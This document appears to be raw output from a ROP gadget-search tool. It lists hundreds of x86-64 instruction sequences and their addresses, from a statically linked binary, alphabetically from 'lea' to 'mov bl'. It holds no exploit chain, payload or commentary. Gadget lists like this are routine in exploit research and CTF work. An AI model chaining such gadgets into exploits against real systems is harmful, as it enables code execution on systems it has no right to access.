0x00000000004149b1 : lea ebx, dword ptr [rdi + rax] ; mov rax, qword ptr [rsp + 8] ; call rax
0x00000000004ae191 : lea ebx, dword ptr [rsi - 0x3271f33] ; test al, 0x97 ; xchg eax, esp ; ret
0x000000000047aa2b : lea ecx, dword ptr [rax + 1] ; call rbx
0x000000000047abc6 : lea ecx, dword ptr [rax + 4] ; lea r9, qword ptr [rsp + 0x20] ; call rbx
0x0000000000478e64 : lea ecx, dword ptr [rbp - 0x40] ; mov rdi, r15 ; call r12
0x00000000004343d0 : lea ecx, dword ptr [rbx + rcx] ; jmp r9
0x000000000044aade : lea ecx, dword ptr [rbx + rcx] ; jmp rcx
0x000000000046fa54 : lea ecx, dword ptr [rbx + rdx] ; add rdx, r12 ; call qword ptr [r10 + rax*8]
0x0000000000429866 : lea ecx, dword ptr [rdx - 8] ; cmovne rax, rcx ; ret
0x000000000048afc0 : lea ecx, dword ptr [rdx] ; jmp 0x48b016
0x000000000048ede0 : lea ecx, dword ptr [rdx] ; jmp 0x48ee36
0x000000000047c657 : lea ecx, dword ptr [rsi + rcx*4] ; add eax, dword ptr [rcx + rdx] ; ret
0x0000000000478c70 : lea ecx, dword ptr [rsp + 0x10] ; mov rdi, r12 ; call rbx
0x0000000000478b8b : lea ecx, dword ptr [rsp + 0x18] ; mov rdi, r12 ; call rbx
0x000000000047ab4e : lea ecx, dword ptr [rsp + 0x20] ; call rbx
0x000000000047ad3c : lea ecx, dword ptr [rsp + 0x30] ; mov rdi, rbp ; call rbx
0x000000000047aa26 : lea ecx, dword ptr [rsp + 0x38] ; lea rcx, qword ptr [rax + 1] ; call rbx
0x000000000045329f : lea edi, dword ptr [rcx + rax + 0x20] ; jmp rdx
0x0000000000401826 : lea edi, dword ptr [rdi + 1] ; jne 0x401825 ; ret
0x000000000041edf1 : lea edx, dword ptr [rax + 0x60] ; mov rax, qword ptr [rdi] ; mov qword ptr [rdx], rax ; ret
0x00000000004789e7 : lea edx, dword ptr [rax + rdx*4] ; mov qword ptr [rax], rdx ; xor eax, eax ; ret
0x00000000004344a4 : lea edx, dword ptr [rbx + rdx] ; jmp rdx
0x000000000042b366 : lea edx, dword ptr [rdx + rcx] ; jmp r10
0x0000000000434898 : lea edx, dword ptr [rdx - 0x40] ; jmp r9
0x000000000042af83 : lea edx, dword ptr [rip + 0x11407] ; cmovne rax, rdx ; ret
0x000000000042a2cf : lea edx, dword ptr [rip + 0x1d62b] ; cmovne rax, rdx ; ret
0x000000000042b15f : lea edx, dword ptr [rip + 0x1df4b] ; cmovne rax, rdx ; ret
0x000000000042aef4 : lea edx, dword ptr [rip + 0x209c6] ; cmovne rax, rdx ; ret
0x000000000042a268 : lea edx, dword ptr [rip + 0x21332] ; cmovne rax, rdx ; ret
0x000000000042a29f : lea edx, dword ptr [rip + 0x272b] ; cmovne rax, rdx ; ret
0x000000000047af8a : lea edx, dword ptr [rip + 0x30] ; cmovne rax, rdx ; ret
0x000000000042a3a9 : lea edx, dword ptr [rip + 0x50d1] ; cmovne rax, rdx ; ret
0x000000000042b223 : lea edx, dword ptr [rip + 0xe697] ; cmovne rax, rdx ; ret
0x000000000042b0e3 : lea edx, dword ptr [rip + 0xe7b7] ; cmovne rax, rdx ; ret
0x00000000004948b1 : lea esi, dword ptr [rbx + rcx*8] ; mov rsi, qword ptr [r14] ; call r12
0x00000000004723dd : lea esi, dword ptr [rip + 0x24ca3d] ; jmp rax
0x000000000044d9bf : lea esi, dword ptr [rsi + rcx - 1] ; std ; rep movsb byte ptr [rdi], byte ptr [rsi] ; cld ; ret
0x000000000047117f : lea esp, dword ptr [rax] ; add byte ptr [rax + 0x39], cl ; ret
0x0000000000484e06 : lea esp, dword ptr [rbx + rdi*8 - 0x76b30001] ; ret 0x2948
0x0000000000403458 : lea esp, dword ptr [rsi] ; ret
0x000000000042b365 : lea r10, qword ptr [r10 + r9] ; jmp r10
0x00000000004948b0 : lea r14, qword ptr [rbx + rcx*8] ; mov rsi, qword ptr [r14] ; call r12
0x00000000004343cf : lea r9, qword ptr [r11 + r9] ; jmp r9
0x0000000000478e63 : lea r9, qword ptr [rbp - 0x40] ; mov rdi, r15 ; call r12
0x000000000048afbf : lea r9, qword ptr [rdx] ; jmp 0x48b017
0x000000000048eddf : lea r9, qword ptr [rdx] ; jmp 0x48ee37
0x0000000000478c6f : lea r9, qword ptr [rsp + 0x10] ; mov rdi, r12 ; call rbx
0x0000000000478b8a : lea r9, qword ptr [rsp + 0x18] ; mov rdi, r12 ; call rbx
0x000000000047ab4d : lea r9, qword ptr [rsp + 0x20] ; call rbx
0x000000000047ad3b : lea r9, qword ptr [rsp + 0x30] ; mov rdi, rbp ; call rbx
0x000000000047aa25 : lea r9, qword ptr [rsp + 0x38] ; lea rcx, qword ptr [rax + 1] ; call rbx
0x0000000000491a3b : lea rax, qword ptr [rax + 8] ; mov qword ptr [r10], r8 ; ret
0x0000000000431e83 : lea rax, qword ptr [rax + rdi + 0x10] ; ret
0x0000000000431e93 : lea rax, qword ptr [rax + rdi + 0x20] ; ret
0x0000000000431e63 : lea rax, qword ptr [rax + rdi - 0x10] ; ret
0x000000000047a02c : lea rax, qword ptr [rcx + rsi] ; ret
0x000000000044d343 : lea rax, qword ptr [rcx - 1] ; ret
0x000000000044b3bb : lea rax, qword ptr [rdi + 0x10] ; ret
0x000000000044b3d0 : lea rax, qword ptr [rdi + 0x11] ; ret
0x000000000044b3ee : lea rax, qword ptr [rdi + 0x12] ; ret
0x000000000044b40e : lea rax, qword ptr [rdi + 0x13] ; ret
0x000000000044b431 : lea rax, qword ptr [rdi + 0x14] ; ret
0x000000000044b450 : lea rax, qword ptr [rdi + 0x15] ; ret
0x000000000044b470 : lea rax, qword ptr [rdi + 0x16] ; ret
0x000000000044b490 : lea rax, qword ptr [rdi + 0x17] ; ret
0x000000000044b4b3 : lea rax, qword ptr [rdi + 0x18] ; ret
0x000000000044b4d8 : lea rax, qword ptr [rdi + 0x19] ; ret
0x000000000044b4f6 : lea rax, qword ptr [rdi + 0x1a] ; ret
0x000000000044b516 : lea rax, qword ptr [rdi + 0x1b] ; ret
0x000000000044b532 : lea rax, qword ptr [rdi + 0x1c] ; ret
0x000000000044b552 : lea rax, qword ptr [rdi + 0x1d] ; ret
0x000000000044b572 : lea rax, qword ptr [rdi + 0x1e] ; ret
0x000000000044b592 : lea rax, qword ptr [rdi + 0x1f] ; ret
0x000000000044b30c : lea rax, qword ptr [rdi + 0xa] ; ret
0x000000000044b32c : lea rax, qword ptr [rdi + 0xb] ; ret
0x000000000044b34e : lea rax, qword ptr [rdi + 0xc] ; ret
0x000000000044b36e : lea rax, qword ptr [rdi + 0xd] ; ret
0x000000000044b38e : lea rax, qword ptr [rdi + 0xe] ; ret
0x000000000044b3a8 : lea rax, qword ptr [rdi + 0xf] ; ret
0x000000000044b256 : lea rax, qword ptr [rdi + 1] ; ret
0x000000000044b269 : lea rax, qword ptr [rdi + 2] ; ret
0x000000000044b274 : lea rax, qword ptr [rdi + 3] ; ret
0x000000000044b287 : lea rax, qword ptr [rdi + 4] ; ret
0x000000000044b29c : lea rax, qword ptr [rdi + 5] ; ret
0x000000000044b2ba : lea rax, qword ptr [rdi + 6] ; ret
0x000000000044b2c6 : lea rax, qword ptr [rdi + 7] ; ret
0x000000000044b2d9 : lea rax, qword ptr [rdi + 8] ; ret
0x000000000044b2ee : lea rax, qword ptr [rdi + 9] ; ret
0x0000000000431eb8 : lea rax, qword ptr [rdi + rax + 0x10] ; ret
0x0000000000431ec8 : lea rax, qword ptr [rdi + rax + 0x20] ; ret
0x0000000000431dc2 : lea rax, qword ptr [rdi + rax + 0x30] ; ret
0x000000000047a274 : lea rax, qword ptr [rdi + rax - 0x20] ; vzeroupper ; ret
0x0000000000446e26 : lea rax, qword ptr [rdi + rax] ; ret
0x000000000044d699 : lea rax, qword ptr [rdi + rcx] ; sub rax, rsi ; ret
0x0000000000479f28 : lea rax, qword ptr [rdi + rsi] ; ret
0x000000000044b242 : lea rax, qword ptr [rdi] ; ret
0x000000000044a82c : lea rax, qword ptr [rdx + 0xa] ; ret
0x000000000044a84c : lea rax, qword ptr [rdx + 0xb] ; ret
0x000000000044a86e : lea rax, qword ptr [rdx + 0xc] ; ret
0x000000000044a88e : lea rax, qword ptr [rdx + 0xd] ; ret
0x000000000044a8ae : lea rax, qword ptr [rdx + 0xe] ; ret
0x000000000044a73e : lea rax, qword ptr [rdx + 0xf] ; ret
0x000000000044a766 : lea rax, qword ptr [rdx + 1] ; ret
0x000000000044a77c : lea rax, qword ptr [rdx + 2] ; ret
0x000000000044a794 : lea rax, qword ptr [rdx + 3] ; ret
0x000000000044a7aa : lea rax, qword ptr [rdx + 4] ; ret
0x000000000044a7bc : lea rax, qword ptr [rdx + 5] ; ret
0x000000000044a7da : lea rax, qword ptr [rdx + 6] ; ret
0x000000000044a6e6 : lea rax, qword ptr [rdx + 7] ; ret
0x000000000044a7ec : lea rax, qword ptr [rdx + 8] ; ret
0x000000000044a80c : lea rax, qword ptr [rdx + 9] ; ret
0x0000000000429855 : lea rax, qword ptr [rdx - 0x10] ; ret
0x000000000044a754 : lea rax, qword ptr [rdx] ; ret
0x0000000000453fb0 : lea rax, qword ptr [rip + 0x26e349] ; ret
0x0000000000401920 : lea rax, qword ptr [rsp + 8] ; ret
0x00000000004149b0 : lea rbx, qword ptr [r15 + rax] ; mov rax, qword ptr [rsp + 8] ; call rax
0x000000000044aadd : lea rcx, qword ptr [r11 + rcx] ; jmp rcx
0x000000000047aa2a : lea rcx, qword ptr [rax + 1] ; call rbx
0x000000000047abc5 : lea rcx, qword ptr [rax + 4] ; lea r9, qword ptr [rsp + 0x20] ; call rbx
0x0000000000429865 : lea rcx, qword ptr [rdx - 8] ; cmovne rax, rcx ; ret
0x000000000047c656 : lea rcx, qword ptr [rsi + rcx*4] ; add eax, dword ptr [rcx + rdx] ; ret
0x000000000045329e : lea rdi, qword ptr [rcx + rax + 0x20] ; jmp rdx
0x0000000000401825 : lea rdi, qword ptr [rdi + 1] ; jne 0x401826 ; ret
0x00000000004344a3 : lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x0000000000434897 : lea rdx, qword ptr [rdx - 0x40] ; jmp r9
0x00000000004723dc : lea rsi, qword ptr [rip + 0x24ca3d] ; jmp rax
0x000000000044d9be : lea rsi, qword ptr [rsi + rcx - 1] ; std ; rep movsb byte ptr [rdi], byte ptr [rsi] ; cld ; ret
0x0000000000403457 : lea rsp, qword ptr [rsi] ; ret
0x000000000045e55a : leave ; call r15
0x000000000044d120 : leave ; jne 0x44d113 ; ret
0x000000000044d1d0 : leave ; jne 0x44d1c3 ; ret
0x000000000044d490 : leave ; jne 0x44d487 ; sub rax, 1 ; ret
0x000000000047b25a : leave ; jne 0x47b217 ; mov rax, rdx ; ret
0x000000000044d698 : leave ; lea rax, qword ptr [rdi + rcx] ; sub rax, rsi ; ret
0x00000000004919f0 : leave ; movsxd rax, dword ptr [r8 + rcx*4] ; add rax, r8 ; jmp rax
0x00000000004728f6 : leave ; movzx eax, byte ptr [rdi + rax] ; mov rax, qword ptr [rsi + rax*8] ; jmp rax
0x0000000000400c63 : leave ; ret
0x00000000004035a9 : leave ; ret 0x8581
0x000000000047ab4a : leave ; xor edx, edx ; lea r9, qword ptr [rsp + 0x20] ; call rbx
0x000000000049d71f : ljmp ptr [rax] ; push -5 ; call qword ptr [rbx]
0x000000000049d70b : ljmp ptr [rax] ; push -5 ; call rdx
0x000000000049b9cf : ljmp ptr [rbx + rdi*8 - 7] ; call qword ptr [rdx]
0x00000000004b1a8f : ljmp ptr [rdi + rbx*4 - 0x60430003] ; std ; jmp qword ptr [rbx]
0x000000000049bb0b : ljmp ptr [rdx + 0x3afff9fb] ; sti ; stc ; jmp rax
0x000000000049d703 : ljmp ptr [rdx + 0x6b] ; sti ; jmp qword ptr [rdx]
0x000000000049bcc7 : ljmp ptr [rsp + rbp + 0x2c3cfffa] ; cli ; jmp rdx
0x00000000004330be : lock add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000485dd7 : lock inc dword ptr [r9 + 0x10] ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000416aa0 : lodsb al, byte ptr [rsi] ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x000000000044caa0 : lodsb al, byte ptr [rsi] ; add byte ptr [rax], al ; add dh, dh ; ret 0x7501
0x0000000000430ef4 : lodsb al, byte ptr [rsi] ; or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00000000004b081d : lodsb al, byte ptr [rsi] ; or byte ptr [rdi + 0x26], al ; and dword ptr cs:[rax], edx ; jmp qword ptr [rdi]
0x00000000004b7bb9 : lodsb al, byte ptr [rsi] ; stc ; jmp qword ptr [rcx]
0x000000000049b3b5 : lodsb al, byte ptr [rsi] ; stc ; jmp rax
0x000000000049b395 : lodsb al, byte ptr [rsi] ; stc ; push rax ; lodsd eax, dword ptr [rsi] ; stc ; call rax
0x0000000000489ab2 : lodsd eax, dword ptr [rsi] ; ret
0x00000000004b7ca1 : lodsd eax, dword ptr [rsi] ; stc ; call qword ptr [rax]
0x00000000004b7cb9 : lodsd eax, dword ptr [rsi] ; stc ; call qword ptr [rdx]
0x000000000049b399 : lodsd eax, dword ptr [rsi] ; stc ; call rax
0x000000000049b439 : lodsd eax, dword ptr [rsi] ; stc ; jmp qword ptr [rax]
0x000000000049b459 : lodsd eax, dword ptr [rsi] ; stc ; jmp rax
0x0000000000401614 : loop 0x40163c ; or rax, rdx ; ret
0x00000000004284fe : loop 0x428551 ; mov esi, ebx ; mov rdi, r13 ; call 0x424749
0x000000000042af4a : loop 0x42aee2 ; sub dword ptr [rax], eax ; add dh, byte ptr [rax + rcx - 9] ; ret 0
0x000000000042c9bd : loop 0x42c9f5 ; shr byte ptr [rcx], 0xc8 ; ret
0x000000000043b5ca : loop 0x43b5c5 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043b5c9 : loop 0x43b5c6 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043e0ea : loop 0x43e0e5 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043e0e9 : loop 0x43e0e6 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000044ec3f : loop 0x44ec59 ; movsxd rax, dword ptr [rsi + rdx*4] ; add rax, rsi ; jmp rax
0x0000000000452c33 : loop 0x452c86 ; mov dword ptr [rax + 0x20], ecx ; mov byte ptr [rax + 0x28], 1 ; ret
0x000000000046fa59 : loop 0x46faa0 ; call qword ptr [rdx + rax*8]
0x000000000047941a : loop 0x479431 ; add byte ptr [rax], al ; cmove rax, rdx ; ret
0x000000000047941a : loop 0x479432 ; add byte ptr [rax], al ; cmove rax, rdx ; ret
0x000000000048dd41 : loop 0x48dd4c ; add rdx, rax ; jmp 0x48dd55
0x0000000000493ce9 : loop 0x493d38 ; add esp, 0x18 ; ret
0x00000000004961b5 : loop 0x4961e1 ; add byte ptr [rbp - 0xcfb8b40], al ; ret
0x000000000049bb9d : loop 0x49bb9a ; call rax
0x000000000049c970 : loop 0x49c9aa ; sti ; jmp rdx
0x00000000004b0bba : loop 0x4b0c0f ; add ch, byte ptr [ebp + ebp*2 + 0x5b] ; ret 0x6f9
0x000000000040196e : loope 0x4019c1 ; mov eax, ebx ; ret
0x000000000043b53a : loope 0x43b535 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043b539 : loope 0x43b536 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043e05a : loope 0x43e055 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043e059 : loope 0x43e056 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000044b7cb : loope 0x44b7d5 ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 0xf] ; ret
0x000000000044f1be : loope 0x44f1b5 ; ret
0x0000000000454c8e : loope 0x454c9b ; pop rbx ; shl eax, cl ; pop rbp ; pop r12 ; ret
0x0000000000460315 : loope 0x46031f ; add byte ptr [rax + 0x63], cl ; ret
0x000000000047b45e : loope 0x47b473 ; je 0x47b484 ; ret
0x00000000004835eb : loope 0x4835f1 ; dec dword ptr [rcx - 0x77] ; ret
0x0000000000489947 : loope 0x489999 ; mov dword ptr [rdi], ecx ; ret
0x0000000000489978 : loope 0x4899cb ; mov dword ptr [rdi - 8], ecx ; ret
0x00000000004899ed : loope 0x489a40 ; mov dword ptr [rdi - 0x10], ecx ; ret
0x0000000000496d16 : loope 0x496d75 ; ret
0x00000000004979de : loope 0x497a40 ; pop rbp ; pop r12 ; ret
0x000000000049bbd9 : loope 0x49bbd6 ; call rax
0x0000000000416277 : loopne 0x4162dd ; pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
0x000000000042344c : loopne 0x423460 ; xchg eax, esp ; ret 0x3de9
0x0000000000428dcf : loopne 0x428e35 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00000000004348f1 : loopne 0x434908 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004348f0 : loopne 0x434909 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000434a41 : loopne 0x434a58 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000434a40 : loopne 0x434a59 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000434b91 : loopne 0x434ba8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000434b90 : loopne 0x434ba9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000434ce1 : loopne 0x434cf8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000434ce0 : loopne 0x434cf9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000434e31 : loopne 0x434e48 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000434e30 : loopne 0x434e49 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000434f81 : loopne 0x434f98 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000434f80 : loopne 0x434f99 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004350d1 : loopne 0x4350e8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004350d0 : loopne 0x4350e9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000043521f : loopne 0x435236 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000043521e : loopne 0x435237 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000435371 : loopne 0x435388 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000435370 : loopne 0x435389 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004354c1 : loopne 0x4354d8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004354c0 : loopne 0x4354d9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000435611 : loopne 0x435628 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000435610 : loopne 0x435629 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000435761 : loopne 0x435778 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000435760 : loopne 0x435779 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004358b1 : loopne 0x4358c8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004358b0 : loopne 0x4358c9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000435a01 : loopne 0x435a18 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000435a00 : loopne 0x435a19 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000435b51 : loopne 0x435b68 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000435b50 : loopne 0x435b69 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004372c1 : loopne 0x4372d8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004372c0 : loopne 0x4372d9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000437411 : loopne 0x437428 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000437410 : loopne 0x437429 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000437561 : loopne 0x437578 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000437560 : loopne 0x437579 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004376b1 : loopne 0x4376c8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004376b0 : loopne 0x4376c9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000437801 : loopne 0x437818 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000437800 : loopne 0x437819 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000437951 : loopne 0x437968 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000437950 : loopne 0x437969 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000437aa1 : loopne 0x437ab8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000437aa0 : loopne 0x437ab9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000437bef : loopne 0x437c06 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000437bee : loopne 0x437c07 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000437d41 : loopne 0x437d58 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000437d40 : loopne 0x437d59 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000437e91 : loopne 0x437ea8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000437e90 : loopne 0x437ea9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000437fe1 : loopne 0x437ff8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000437fe0 : loopne 0x437ff9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000438131 : loopne 0x438148 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000438130 : loopne 0x438149 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000438281 : loopne 0x438298 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000438280 : loopne 0x438299 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004383d1 : loopne 0x4383e8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004383d0 : loopne 0x4383e9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000438521 : loopne 0x438538 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000438520 : loopne 0x438539 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000044ebad : loopne 0x44ebc7 ; movsxd rcx, dword ptr [rsi + rax*4] ; add rcx, rsi ; jmp rcx
0x0000000000452908 : loopne 0x45291d ; cmp eax, 4 ; je 0x452917 ; ret
0x0000000000454c92 : loopne 0x454cf5 ; pop r12 ; ret
0x000000000046a27f : loopne 0x46a20c ; ret
0x00000000004743d1 : loopne 0x4743d7 ; dec dword ptr [rcx + 0x63] ; ret
0x00000000004758f9 : loopne 0x47595d ; pop rbp ; pop r12 ; pop r13 ; ret
0x00000000004760d5 : loopne 0x476139 ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000048931d : loopne 0x489326 ; sub eax, 1 ; ret
0x000000000049b228 : loopne 0x49b28d ; stc ; call rax
0x000000000049b604 : loopne 0x49b5e3 ; stc ; jmp rax
0x000000000049b608 : loopne 0x49b5e9 ; stc ; jmp rax
0x000000000049c2b8 : loopne 0x49c2ac ; cli ; inc dword ptr [rax] ; in al, dx ; cli ; jmp qword ptr [rax]
0x00000000004ae194 : loopne 0x4ae174 ; cld ; test al, 0x97 ; xchg eax, esp ; ret
0x00000000004b6d70 : loopne 0x4b6d5c ; clc ; call qword ptr [rax]
0x00000000004b7ca0 : loopne 0x4b7c52 ; stc ; call qword ptr [rax]
0x00000000004adbaa : mov ah, 0x13 ; ret
0x0000000000498c5a : mov ah, 0x24 ; cwde ; add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 0x11], cl ; call rax
0x00000000004983ba : mov ah, 0x24 ; cwde ; add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 1], cl ; call rax
0x000000000049bdb4 : mov ah, 0x2e ; cli ; inc dword ptr [rsi + rbp - 6] ; call rsp
0x00000000004ae050 : mov ah, 0xa5 ; ret
0x00000000004262a8 : mov ah, 0xb5 ; sub dword ptr [rax], eax ; ret
0x000000000049b469 : mov ah, 0xf9 ; call qword ptr [rax + 0x20fff9b6]
0x000000000049b4a9 : mov ah, 0xf9 ; call qword ptr [rax]
0x000000000049b449 : mov ah, 0xf9 ; call rax
0x000000000049b8bc : mov ah, 7 ; cli ; inc dword ptr [rdi + rax - 6] ; call rsp
0x00000000004ad9a4 : mov ah, bl ; push rsi ; ret
0x0000000000491b36 : mov al, 0 ; add byte ptr [rax], al ; ret
0x000000000045e554 : mov al, 0 ; add byte ptr [rax], al ; xor r9d, r9d ; call r15
0x000000000049b150 : mov al, 0x19 ; stc ; call rax
0x000000000049c08c : mov al, 0x21 ; cli ; call qword ptr [rax]
0x000000000049be88 : mov al, 0x22 ; cli ; jmp qword ptr [rax]
0x000000000049b170 : mov al, 0x22 ; stc ; call rax
0x000000000049be10 : mov al, 0x2b ; cli ; jmp qword ptr [rax]
0x000000000049bc40 : mov al, 0x2d ; cli ; inc dword ptr [rax + 0x2d] ; cli ; call rax
0x000000000049be18 : mov al, 0x31 ; cli ; inc dword ptr [rax + 0x31] ; cli ; call rax
0x000000000049c150 : mov al, 0x3f ; cli ; inc eax ; cli ; call rax
0x000000000049b1f0 : mov al, 0x4f ; stc ; jmp qword ptr [rax]
0x000000000049b920 : mov al, 0xa ; cli ; inc dword ptr [rax + 0xa] ; cli ; call rax
0x000000000049c248 : mov al, 0xa7 ; cli ; inc dword ptr [rax - 0x6c] ; cli ; call rax
0x000000000049b6a0 : mov al, 0xbf ; stc ; inc dword ptr [rax] ; sar ecx, -1 ; push rax ; ret 0xfff9
0x00000000004471ef : mov al, 0xc5 ; std ; xlatb ; ret
0x0000000000485f7c : mov al, 0xe7 ; and eax, dword ptr [rax] ; ret
0x00000000004afe56 : mov al, 0xee ; fcmovb st(0), st(3) ; ret
0x000000000049c2e0 : mov al, 0xef ; cli ; inc eax ; out dx, eax ; cli ; jmp rax
0x000000000049c308 : mov al, 0xf0 ; cli ; call rax
0x000000000049c32c : mov al, 0xf1 ; cli ; call rax
0x00000000004b6b11 : mov al, 0xf7 ; jmp qword ptr [rbx]
0x000000000049b4a1 : mov al, 0xf9 ; call qword ptr [rax]
0x00000000004ab0d1 : mov al, 0xfc ; dec eax ; mov al, 0xfc ; jmp qword ptr [rax]
0x00000000004ab059 : mov al, 0xfc ; jmp qword ptr [rax]
0x000000000049bb84 : mov al, 0xfc ; stc ; jmp qword ptr [rax]
0x000000000049b980 : mov al, 0xfd ; stc ; jmp qword ptr [rax]
0x000000000049b748 : mov al, 6 ; cli ; inc dword ptr [rax + 6] ; cli ; call rsi
0x00000000004bb42d : mov al, byte ptr [rax] ; add byte ptr [rdx + 0x51], cl ; hlt ; jmp qword ptr [rcx]
0x000000000046a28b : mov al, byte ptr [rbx - 0x76ffffe6] ; ret 0xc389
0x0000000000448fc6 : mov al, byte ptr [rcx + 2] ; mov byte ptr [rdx + 2], al ; mov rax, rdi ; ret
0x0000000000448fe4 : mov al, byte ptr [rcx + 4] ; mov byte ptr [rdx + 4], al ; mov rax, rdi ; ret
0x000000000044a750 : mov al, byte ptr [rcx] ; mov byte ptr [rdx], al ; lea rax, qword ptr [rdx] ; ret
0x0000000000448fa0 : mov al, byte ptr [rcx] ; mov byte ptr [rdx], al ; mov rax, rdi ; ret
0x0000000000448fb0 : mov ax, word ptr [rcx] ; mov word ptr [rdx], ax ; mov rax, rdi ; ret
0x000000000043c301 : mov bh, 0x16 ; mov word ptr [rdi], dx ; ret
0x000000000045e72f : mov bh, 0x47 ; or cl, byte ptr [rax + 0x39] ; ret 0x1176
0x000000000044b668 : mov bh, 0x48 ; lea eax, dword ptr [rdi + 7] ; ret
0x00000000004aee84 : mov bh, 0xb4 ; mov edi, dword ptr [rdx] ; ret
0x0000000000419e39 : mov bh, 0xd8 ; add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0x2c20
0x000000000042b0e5 : mov bh, 0xe7 ; add byte ptr [rax], al ; cmovne rax, rdx ; ret
0x000000000049b40d : mov bh, 0xf9 ; call rax
0x000000000049b3cd : mov bh, 0xf9 ; jmp qword ptr [rax]
0x000000000048e95c : mov bh, 0xff ; nop ; add rsp, 8 ; ret
0x00000000004b0593 : mov bh, 6 ; movsd dword ptr [rdi], dword ptr [rsi] ; int1 ; ret 0x5803
0x00000000004b7559 : mov bh, cl ; jmp qword ptr [rcx]
0x000000000049b2e5 : mov bh, cl ; jmp qword ptr [rsi + 0x26fff98a]
0x000000000049b2e9 : mov bh, cl ; jmp qword ptr [rsi]
0x000000000044cf5e : mov bl, 0 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000047b25c : mov bl, 0x48 ; mov eax, edx ; ret
0x0000000000460fc2 : mov bl, 0x4c ; add edi, ebx ; jmp rdi
